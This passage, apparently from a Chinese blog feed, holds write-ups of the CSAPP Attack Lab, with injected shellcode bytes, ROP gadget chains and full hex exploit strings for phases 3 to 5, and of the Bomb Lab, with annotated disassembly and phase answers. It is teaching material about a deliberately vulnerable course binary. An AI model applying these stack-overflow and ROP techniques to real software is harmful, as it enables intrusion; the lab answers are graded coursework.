\u0026#34;%.8x\u0026#34;, val); return strncmp(sval, s, 9) == 0; } 也就是说，要把cookie转换成对应的字符串传进去\n注意第6行，s的位置是随机的，我们写在getbuf栈中的字符串很有可能被覆盖，一旦被覆盖就无法正常比较。\n因此，考虑把cookie的字符串数据存在test的栈上，其它部分与上题相同，这里不再重复思路。\n注入代码 先查找test栈顶指针的位置：\n0x5561dca8，这就是字符串存放的位置，也是调用touch3应该传入的参数，又touch3代码的地址为4018fa。从而得到代码：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 字节级表示为：\n1 2 3 4 5 6 Disassembly of section .text: 0000000000000000 \u0026lt;.text\u0026gt;: 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq 栈帧讲解 我们期望的栈帧为\n逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们注入的代码 代码执行，先将存在caller的栈中的字符串传给参数寄存器%rdi，再将touch3的地址压入栈中 代码执行ret，从栈中弹出touch3指令，成功跳转 Solution cookie0x59b997fa作为字符串转换为ASCII为：35 39 62 39 39 37 66 61\n注入代码段的地址与上题一样，同样为0x5561dc78\n由于在test栈帧中多利用了一个字节存放cookie，所以本题要输入56个字节。注入代码的字节表示放在开头，33-40个字节放置注入代码的地址用来覆盖返回地址，最后八个字节存放cookie的ASCII 。于是得到如下输入：\n1 2 3 4 5 6 7 48 c7 c7 a8 dc 61 55 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 攻击成功！\nPart II:Return-Oriented Programing 在第二部分中，我们要攻击的是rtarget，他的代码内容和第一部分一致，但采用了两种策略来阻止缓冲区溢出攻击\n栈随机化 这段程序分配的栈的位置正每次运行时都是随机的，这就使我们无法确定在哪里插入代码 限制可执行代码区域 也就是存放在栈上的代码不可执行，使得插入的恶意代码无法执行 针对这些防御措施，文档提供了攻击策略，即ROP：面向返回的程序设计，就是在已经存在的程序中找到特定的以ret结尾的指令序列为我们所用，称这样的代码段为gadget，把要用到部分的地址压入栈中，每次ret后又会取出一个新的gadget，于是这样就能形成一个程序链，实现我们的目的。我喜欢将这种攻击方式称作“就地取材，拼凑代码”。\n同时也给出指令编码表\n举个例子：\nrtarget有这样一个函数：\n1 2 3 4 void setval_210(unsigned *p) { *p = 3347663060U; } 它的汇编代码字节级表示为：\n1 2 3 0000000000400f15 \u0026lt;setval_210\u0026gt;: 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 查表可知，取其中一部分字节序列 48 89 c7 就表示指令movq %rax, %rdi，这整句指令的地址为0x400f15，于是从0x400f18开始的代码就可以变成下面这样：\n1 2 movq %rax, %rdi ret 这个小片段就可以作为一个gadget为我们所用。\n其它一些可以利用的代码都在文件farm.c中展示了出来\nlevel1 本题的任务和phase2相同，都是要求返回到touch2函数，phase2中用到的注入代码为\n1 2 3 movq $0x59b997fa, %rdi pushq $0x4017ec ret 由于我们无法找到这个特定值的gadget，所以我们可以先将我们需要的值写入栈中，再利用pop命令将其pop到rdi寄存器中，最后再返回touch2的函数起始地址，任务便完成。\n但是farm中找不到pop到rdi寄存器指令的gadget，所以我们另辟蹊径，先pop到rax中，再mov %rax，%rdi，即\n1 2 3 4 5 popq %rax ret ############# mov %rax,%rdi ret 逻辑如下：\ngetbuf执行ret，从栈中弹出返回地址，跳转到我们的gadget01 gadget01执行，将cookie弹出，赋值给%rax，然后执行ret，继续弹出返回地址，跳转到gadget2 gadget2执行，将cookie值成功赋值给参数寄存器%rdi，然后执行ret，继续弹出返回地址，跳转到touch2 Solution 首要问题是找到我们需要的gadget\n先用如下指令得到target的汇编代码及字节级表示\n1 objdump -d rtarget \u0026gt; rtarget.s 查表知，pop %rax用58表示，于是查找58\n1 2 3 00000000004019a7 \u0026lt;addval_219\u0026gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq retq 得到指令地址为0x4019ab\nmovq %rax, %rdi表示为48 89 c7，刚好能找到！其中 90 表示“空”，可以忽略\n1 2 3 00000000004019c3 \u0026lt;setval_426\u0026gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 得到指令地址为0x4019c5\n根据上图的栈帧，就能写出输入序列：\n1 2 3 4 5 6 7 8 9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 level2 来自官方的劝退哈哈哈，Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now. Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.\n这道题主要是在rtarget中返回到touch3，看似没有难度\nPhase 3中用到的注入代码为：\n1 2 3 movq $0x5561dca8, %rdi pushq $0x4018fa ret 其中0x5561dca8是栈中cookie存放的地址。\n在本题中由于栈随机化，不能直接将0x5561dca8地址直接给%rdi，可以利用%rsp的相对偏移量来获取cookie的存放地址，\n1 2 3 4 5 6 7 8 9 10 11 movq $0x30(%rsp), %rdi movq %rsp, %rax movq %rax, %rdi lea (%rdi,%rsi,1),%rax movq %rax, %rdi movl %eax, %edi movl %eax, %edx movl %esp, %eax movl %ecx, %esi pushq $0x4018fa ret 查表，movq %rsp, xxx表示为48 89 xx，查找一下有没有可用的gadget\n1 2 3 0000000000401aab \u0026lt;setval_350\u0026gt;: 401aab: c7 07 48 89 e0 90 movl $0x90e08948,(%rdi) 401ab1: c3 retq 还真找到了，48 89 e0对应的汇编代码为\n1 movq %rsp, %rax 地址为：0x401aad\n根据提示，有一个gadget一定要用上\n1 2 3 00000000004019d6 \u0026lt;add_xy\u0026gt;: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 地址为：0x4019d6\n通过合适的赋值，这段代码就能实现%rsp加上段内偏移地址来确定cookie的位置\n剩下部分流程与Phase 3一致，大体思路如下：\n先取得栈顶指针的位置 取出存在栈中得偏移量的值 通过lea (%rdi,%rsi,1),%rax得到 cookie 的地址 将 cookie 的地址传给%rdi 调用touch 3 由于gadget的限制，中间的细节需要很多尝试，尝试过程不再一一列举了，直接给出代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #地址：0x401aad movq %rsp, %rax ret #地址：0x4019a2 movq %rax, %rdi ret #地址：0x4019cc popq %rax ret #地址：0x4019dd movl %eax, %edx ret #地址：0x401a70 movl %edx, %ecx ret #地址：0x401a13 movl %ecx, %esi ret #地址：0x4019d6 lea (%rdi,%rsi,1),%rax ret #地址：0x4019a2 movq %rax, %rdi ret 注意movl %ecx, %esi这条指令对应89 d1，截取下面部分\n1 2 3 0000000000401a6e \u0026lt;setval_167\u0026gt;: 401a6e:\tc7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74:\tc3 按理说后面是91不是90(nop)，所以不能取，但在x86汇编中，0x91 表示 xchg eax, ecx 指令。这条指令的作用是交换 %eax 和 %ecx 寄存器的值。不影响寄存器的值，所以可以。\n栈帧讲解 为节省空间，每一行代码都省略了后面的ret，\n逻辑在图上标的很清楚，这里就不再用文字写啦！\n要注意，getbuf执行ret后相当于进行了一次pop操作，test的栈顶指针%rsp=%rsp+0x8，所以cookie相对于此时栈顶指针的偏移量是0x48而不是0x50\nSolution 根据上图的栈帧，写出输入序列：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 70 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 ","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/R_hu8573152181181443583.jpg","permalink":"https://chenyuan1125.github.io/p/csappattack%E5%AE%9E%E9%AA%8C/","title":"CSAPP:attack实验"},{"content":"Bomb实验 题目解析 注意：本人所写的注释可能有些错误，有问题还请大家批评指正，注释中*的用法和C语言类似，有些寄存器名称没有带%\n题目只给了一个main函数，我们可以大致看出来，它的模式是从某个地方读取字符串，然后作为参数输入每个关卡phase_，进行验证。具体的情况没有显示，说明我们需要通过某种手段去进行探查：\n1 objdump -d bomb \u0026gt; bomb.s 同时看到bomb.c中：\n1 2 3 4 5 /* When run with no arguments, the bomb reads its input lines * from standard input. */ if (argc == 1) { infile = stdin; } 说明可以通过文件读取的方式进行读取。\n寄存器说明：\nPhase_1 关键代码\n1 2 3 4 5 6 7 8 9 0000000000400ee0 \u0026lt;phase_1\u0026gt;: 400ee0:\t48 83 ec 08 sub $0x8,%rsp //将栈指针减少8，也就是入栈 400ee4:\tbe 00 24 40 00 mov $0x402400,%esi 400ee9:\te8 4a 04 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; /*test指令同逻辑与and运算，但只设置条件码寄存器，不改变目的寄存器的值，test %eax,%eax用于测试寄存器%eax是否为空，由于寄存器%rax一般存放函数的返回值，此处应该存放的是函数 strings_not_equal的值，而%eax是%rax的低32位表示，所以不难分析出，当%eax值为0时，test的两个操作数相同且都为0，条件码ZF置位为1，即可满足下一行代码的跳转指令*/ 400eee:\t85 c0 test %eax,%eax 400ef0:\t74 05 je 400ef7 \u0026lt;phase_1+0x17\u0026gt; //当ZF位为0时，跳转到400ef7处 400ef2:\te8 43 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //调用explode-bomb函数，爆炸 400ef7:\t48 83 c4 08 add $0x8,%rsp //出栈 400efb:\tc3 ret 仅从函数调用的角度来看，phase_1的参数存在1st argument寄存器中：%rdi，然后这个参数作为第一个参数，与0x402400作为第二个参数一起被传入到strings_not_equal中，进行一些判定操作。\n0x402400像一个地址，使用gdb对程序进行debug，设置断点查看``0x402400的值，发现是Border relations with Canada have never been better.`，答案已找到\nPhase_2 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 0000000000400efc \u0026lt;phase_2\u0026gt;: 400efc:\t55 push %rbp 400efd:\t53 push %rbx 400efe:\t48 83 ec 28 sub $0x28,%rsp //入栈，栈指针减少40 400f02:\t48 89 e6 mov %rsp,%rsi //将%rsp赋给%rsi(第二个参数寄存器) 400f05:\te8 52 05 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; 400f0a:\t83 3c 24 01 cmpl $0x1,(%rsp) //将(%rsp)与1比较 400f0e:\t74 20 je 400f30 \u0026lt;phase_2+0x34\u0026gt; //若相等，则跳转到0x400f30 400f10:\te8 25 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //若不相等，则爆炸 400f15:\teb 19 jmp 400f30 \u0026lt;phase_2+0x34\u0026gt; 400f17:\t8b 43 fc mov -0x4(%rbx),%eax //(%rbx-4)取值后赋给eax寄存器 400f1a:\t01 c0 add %eax,%eax //eax=eax+eax 400f1c:\t39 03 cmp %eax,(%rbx) //比较%eax和(%rbx)的值 400f1e:\t74 05 je 400f25 \u0026lt;phase_2+0x29\u0026gt; //如果相等，跳转到0x400f25 400f20:\te8 15 05 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400f25:\t48 83 c3 04 add $0x4,%rbx //rbx寄存器+4 400f29:\t48 39 eb cmp %rbp,%rbx //%rbx与%rbp比较 400f2c:\t75 e9 jne 400f17 \u0026lt;phase_2+0x1b\u0026gt; //如果不相等，跳转到0x400f17 400f2e:\teb 0c jmp 400f3c \u0026lt;phase_2+0x40\u0026gt; //跳转到400f3c 400f30:\t48 8d 5c 24 04 lea 0x4(%rsp),%rbx //(%rsp+4)后赋值给%rbx 400f35:\t48 8d 6c 24 18 lea 0x18(%rsp),%rbp //(%rsp+18)后再赋值给%rbp 400f3a:\teb db jmp 400f17 \u0026lt;phase_2+0x1b\u0026gt; //跳转到0x40f17 400f3c:\t48 83 c4 28 add $0x28,%rsp //出栈，栈指针增加40 400f40:\t5b pop %rbx 400f41:\t5d pop %rbp 400f42:\tc3 ret 可以看出这个阶段读取六个数字，并通过一个循环将其与对应的值对比，这些对应值的规律就是1 2 4 8 16 32，答案已出。\n（lea 0x18(%rsp),%rbp指令是将%rsp+40传给%rbp，lea指令用于计算有效地址，以及加法和有限的乘法运算，而其余如mov -0x4(%rbx),%eax则是取(%rbx-4)的值再传给%eax）\nPhase_3 关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 0000000000400f43 \u0026lt;phase_3\u0026gt;: 400f43:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少24 400f47:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //%rsp+12赋给%rcx 400f4c:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //%rsp+8赋给%rdx 400f51:\tbe cf 25 40 00 mov $0x4025cf,%esi //将0x4025cf赋给%esi 第二个参数寄存器 400f56:\tb8 00 00 00 00 mov $0x0,%eax //将0x0赋给%eax 400f5b:\te8 90 fc ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; //调用scanf输入函数 400f60:\t83 f8 01 cmp $0x1,%eax //比较返回值和0x1的大小,sscanf的返回值是成功解析和存储的参数数目。 400f63:\t7f 05 jg 400f6a \u0026lt;phase_3+0x27\u0026gt; //如果大于则跳转到0x400f6a 400f65:\te8 d0 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 400f6a:\t83 7c 24 08 07 cmpl $0x7,0x8(%rsp) //比较0x7和(%rsp+8)值的大小 400f6f:\t77 3c ja 400fad \u0026lt;phase_3+0x6a\u0026gt; //如果 (%rsp+8)\u0026gt;7 跳转到0x400fad即爆炸 400f71:\t8b 44 24 08 mov 0x8(%rsp),%eax //当(%rsp+8)\u0026lt;=7时，将(%rsp+8)的值放入%eax中 400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8) //跳转到存放在%rax*8+0x402470内存位置上的指令，即%eax*8+0x402470 400f7c:\tb8 cf 00 00 00 mov $0xcf,%eax //将0xcf赋给%eax 400f81:\teb 3b jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; //跳转到0x400fbe 400f83:\tb8 c3 02 00 00 mov $0x2c3,%eax 400f88:\teb 34 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f8a:\tb8 00 01 00 00 mov $0x100,%eax 400f8f:\teb 2d jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f91:\tb8 85 01 00 00 mov $0x185,%eax 400f96:\teb 26 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f98:\tb8 ce 00 00 00 mov $0xce,%eax 400f9d:\teb 1f jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400f9f:\tb8 aa 02 00 00 mov $0x2aa,%eax 400fa4:\teb 18 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fa6:\tb8 47 01 00 00 mov $0x147,%eax 400fab:\teb 11 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fad:\te8 88 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 400fb2:\tb8 00 00 00 00 mov $0x0,%eax 400fb7:\teb 05 jmp 400fbe \u0026lt;phase_3+0x7b\u0026gt; 400fb9:\tb8 37 01 00 00 mov $0x137,%eax 400fbe:\t3b 44 24 0c cmp 0xc(%rsp),%eax //比较(%rsp+12)和%eax的值 400fc2:\t74 05 je 400fc9 \u0026lt;phase_3+0x86\u0026gt; //如果相等，则跳转到0x400fc9 400fc4:\te8 71 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //如果不相等，就爆炸 400fc9:\t48 83 c4 18 add $0x18,%rsp //出栈，栈指针增加24 400fcd:\tc3 ret 注意：jg指令是后面的操作数大于前面的操作数，不要弄反了\n首先根据sscanf函数确定有两个参数，刚好%rsp+8和%rsp+12没有赋值，于是推测这两个值对应这两个变量，接着由于sscanf函数返回参数的数目，所以必须输入两个数，并且第一个参数要小于等于7，最后根据下面这条关键指令判断第二个参数取决于第一个参数的值，使用gdb遍历打印相应的跳转地址的值，得到以下列表。\n最关键的指令是：\n400f75:\tff 24 c5 70 24 40 00 jmp *0x402470(,%rax,8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 (gdb) x/ *0x402470 第一个参数为0，第二个参数为0xcf 0x400f7c \u0026lt;phase_3+57\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/s *0x402478 第一个参数为1，第二个参数为0x137 311 0x400fb9 \u0026lt;phase_3+118\u0026gt;: \u0026#34;\\270\\067\\001\u0026#34; (gdb) x/ *0x402480 第一个参数为2，第二个参数为0x2c3 0x400f83 \u0026lt;phase_3+64\u0026gt;: \u0026#34;\\270\\303\\002\u0026#34; (gdb) x/ *0x402488 第一个参数为3，第二个参数为0x100 0x400f8a \u0026lt;phase_3+71\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x402490 第一个参数为4，第二个参数为0x185 0x400f91 \u0026lt;phase_3+78\u0026gt;: \u0026#34;\\270\\205\\001\u0026#34; (gdb) x/ *0x402498 第一个参数为5，第二个参数为0xce 0x400f98 \u0026lt;phase_3+85\u0026gt;: \u0026#34;\\270\u0026#34; (gdb) x/ *0x4024a0 第一个参数为6，第二个参数为0x2aa 0x400f9f \u0026lt;phase_3+92\u0026gt;: \u0026#34;\\270\\252\\002\u0026#34; (gdb) x/ *0x4024a8 第一个参数为7，第二个参数为0x147 0x400fa6 \u0026lt;phase_3+99\u0026gt;: \u0026#34;\\270G\\001\u0026#34; Phase_4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 000000000040100c \u0026lt;phase_4\u0026gt;: 40100c:\t48 83 ec 18 sub $0x18,%rsp //入栈，栈指针减少18 401010:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx //rcx=rsp+12 401015:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx //rdx=rsp+8 40101a:\tbe cf 25 40 00 mov $0x4025cf,%esi //esi=0x4025cf 40101f:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 401024:\te8 c7 fb ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 401029:\t83 f8 02 cmp $0x2,%eax //比较eax和2 40102c:\t75 07 jne 401035 \u0026lt;phase_4+0x29\u0026gt; //如果不相等，跳转到0x401035即爆炸 40102e:\t83 7c 24 08 0e cmpl $0xe,0x8(%rsp) //相等则比较(%rsp+8)的内存值和14 401033:\t76 05 jbe 40103a \u0026lt;phase_4+0x2e\u0026gt; //如果(%rsp+8)\u0026lt;=14,跳转到0x40103a 401035:\te8 00 04 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 40103a:\tba 0e 00 00 00 mov $0xe,%edx //edx=14 参数3 40103f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 参数2 401044:\t8b 7c 24 08 mov 0x8(%rsp),%edi //edi=*(rsp+8) 参数1 401048:\te8 81 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 40104d:\t85 c0 test %eax,%eax //判断返回值是否为0 40104f:\t75 07 jne 401058 \u0026lt;phase_4+0x4c\u0026gt; //如果不等于0，跳转到401058即爆炸 401051:\t83 7c 24 0c 00 cmpl $0x0,0xc(%rsp) //比较*(rsp+12)和0 401056:\t74 05 je 40105d \u0026lt;phase_4+0x51\u0026gt; //如果相等，跳转到40105d 401058:\te8 dd 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; 40105d:\t48 83 c4 18 add $0x18,%rsp //出栈 401061:\tc3 ret 很明显要通过此关必须在调用func4后返回0，而且第二个参数要等于0，所以只需通过调整第一个参数的值来使得func4函数返回0\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 0000000000400fce \u0026lt;func4\u0026gt;: 400fce:\t48 83 ec 08 sub $0x8,%rsp //入栈 400fd2:\t89 d0 mov %edx,%eax //eax=edx=14 rsi=0 edi=第一个参数 400fd4:\t29 f0 sub %esi,%eax //eax=eax-esi=14 400fd6:\t89 c1 mov %eax,%ecx //ecx=eax=14 400fd8:\tc1 e9 1f shr $0x1f,%ecx //ecx逻辑右移31位 ecx=0 400fdb:\t01 c8 add %ecx,%eax //eax=eax+ecx=14 400fdd:\td1 f8 sar %eax //eax算数右移一位 eax=7 400fdf:\t8d 0c 30 lea (%rax,%rsi,1),%ecx //ecx=rsi+rax=7 400fe2:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400fe4:\t7e 0c jle 400ff2 \u0026lt;func4+0x24\u0026gt; //若edi\u0026gt;=ecx 跳转到0x400ff2 400fe6:\t8d 51 ff lea -0x1(%rcx),%edx //否则，edx=rcx-1=6 400fe9:\te8 e0 ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=0 edx=13 400fee:\t01 c0 add %eax,%eax //eax=eax*2 400ff0:\teb 15 jmp 401007 \u0026lt;func4+0x39\u0026gt; 跳转到0x401007 400ff2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 400ff7:\t39 f9 cmp %edi,%ecx //比较edi和ecx=7 400ff9:\t7d 0c jge 401007 \u0026lt;func4+0x39\u0026gt; //若ecx\u0026gt;=edi 跳转到0x401007 400ffb:\t8d 71 01 lea 0x1(%rcx),%esi //若ecx\u0026lt;edi，esi=rcx+1=8 400ffe:\te8 cb ff ff ff call 400fce \u0026lt;func4\u0026gt; //调用func4函数 edi esi=8 edx=14 401003:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax //eax=rax+rax+1 不能经过这条指令，edi必须小于等于7 401007:\t48 83 c4 08 add $0x8,%rsp //出栈 40100b:\tc3 ret 首先edi寄存器也就是我们输入的第一个参数必须小于等于7，\nlea 0x1(%rax,%rax,1),%eax这条指令不能执行，一旦执行这条执行，那么eax寄存器就不可能等于0，同时我们观察到两个判断语句都有等于条件，于是我们把第一个参数设置为7，很顺利地使eax寄存器等于0，当然还有其它的可能性，可以一一去试。\n1 7 0 | Phase_5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 0000000000401062 \u0026lt;phase_5\u0026gt;: 401062:\t53 push %rbx //保存调用者寄存器 401063:\t48 83 ec 20 sub $0x20,%rsp //入栈，栈指针减少32 401067:\t48 89 fb mov %rdi,%rbx //rbx=rdi 第一个参数 40106a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax //将 %fs 段寄存器中偏移地址为 0x28 的内容加载到 %rax 寄存器中。 401071:\t00 00 //%fs 是一个段寄存器，通常用于访问线程本地存储（Thread Local Storage, TLS） 401073:\t48 89 44 24 18 mov %rax,0x18(%rsp) //将其放在栈上 *(rsp+24)=rax 401078:\t31 c0 xor %eax,%eax // eax=0 40107a:\te8 9c 02 00 00 call 40131b \u0026lt;string_length\u0026gt; 40107f:\t83 f8 06 cmp $0x6,%eax //字符串的长度与6比较 401082:\t74 4e je 4010d2 \u0026lt;phase_5+0x70\u0026gt; //若字符串的长度等于6，跳转到0x4010d2 401084:\te8 b1 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 401089:\teb 47 jmp 4010d2 \u0026lt;phase_5+0x70\u0026gt; 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } *(rsp+16)=0xb9 *(rsp+17)=0xbf *(rsp+18)=0xbe *(rsp+19)=0xb5 *(rsp+20)=0xb6 *(rsp+21)=0xb7 4010ae:\tc6 44 24 16 00 movb $0x0,0x16(%rsp) //否则，将字节0x0存入(rsp+22)地址中 4010b3:\tbe 5e 24 40 00 mov $0x40245e,%esi //esi=0x40245e 4010b8:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi //rdi=rsp+16 *(rsp+16)=0xbb 4010bd:\te8 76 02 00 00 call 401338 \u0026lt;strings_not_equal\u0026gt; 4010c2:\t85 c0 test %eax,%eax //判断返回值是否为0 4010c4:\t74 13 je 4010d9 \u0026lt;phase_5+0x77\u0026gt; //返回值为0，则跳转到0x4010d9 4010c6:\te8 6f 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //否则，爆炸 4010cb:\t0f 1f 44 00 00 nopl 0x0(%rax,%rax,1) 4010d0:\teb 07 jmp 4010d9 \u0026lt;phase_5+0x77\u0026gt; 4010d2:\tb8 00 00 00 00 mov $0x0,%eax //eax=0 4010d7:\teb b2 jmp 40108b \u0026lt;phase_5+0x29\u0026gt; //跳转到0x40108b 4010d9:\t48 8b 44 24 18 mov 0x18(%rsp),%rax //rax=*(rsp+24) 4010de:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax //rax与%fs段寄存器中偏移地址为0x28的内容异或来检查内容是否被修改 4010e5:\t00 00 4010e7:\t74 05 je 4010ee \u0026lt;phase_5+0x8c\u0026gt; //如果相等，则跳转到0x4010ee 4010e9:\te8 42 fa ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; //否则调用错误处理历程 4010ee:\t48 83 c4 20 add $0x20,%rsp //出栈，栈指针增加32 4010f2:\t5b pop %rbx 4010f3:\tc3 ret 关键代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 40108b:\t0f b6 0c 03 movzbl (%rbx,%rax,1),%ecx //从(rax+rbx)处读取的1字节数据零扩展到ecx中 ecx=0x69 eax=0 40108f:\t88 0c 24 mov %cl,(%rsp) //将cl的值存入rsp所指的地址中(rcx的低8位) *(%rsp)=0x69 401092:\t48 8b 14 24 mov (%rsp),%rdx //rdx=*(rsp)=0x69 401096:\t83 e2 0f and $0xf,%edx //edx=edx\u0026amp;0xf=9 401099:\t0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx //从(rdx+0x4024b0)处读取的1字节数据零扩展到edx,edx=0xb9 4010a0:\t88 54 04 10 mov %dl,0x10(%rsp,%rax,1) //将dl(edx的低8位)存入((rax+rsp)+16)地址中 *(rsp+16+rax)=0xb9 4010a4:\t48 83 c0 01 add $0x1,%rax //rax=rax+1=1 4010a8:\t48 83 f8 06 cmp $0x6,%rax //比较rax和6 4010ac:\t75 dd jne 40108b \u0026lt;phase_5+0x29\u0026gt; //若rax!=6，则跳转到0x40108b 这部分的循环相当于以下C程序： for(int rax=0;rax!=6;rax++){ target[rax]=array[input[rax]\u0026amp;0xf]; } 就是要使得所输入的字符串的十六进制取后四位，并作为array数组的下标，让array数组与目标字符串相等。\n目标字符串在0x40245e内存地址中，即0x666c79657273 \u0026ldquo;flyers\u0026rdquo;\narray数组在0x4024b0内存地址中,如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 (gdb) x/16c 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: 109 \u0026#39;m\u0026#39; 97 \u0026#39;a\u0026#39; 100 \u0026#39;d\u0026#39; 117 \u0026#39;u\u0026#39; 105 \u0026#39;i\u0026#39; 101 \u0026#39;e\u0026#39; 114 \u0026#39;r\u0026#39; 115 \u0026#39;s\u0026#39; 0x4024b8 \u0026lt;array.3449+8\u0026gt;: 110 \u0026#39;n\u0026#39; 102 \u0026#39;f\u0026#39; 111 \u0026#39;o\u0026#39; 116 \u0026#39;t\u0026#39; 118 \u0026#39;v\u0026#39; 98 \u0026#39;b\u0026#39; 121 \u0026#39;y\u0026#39; 108 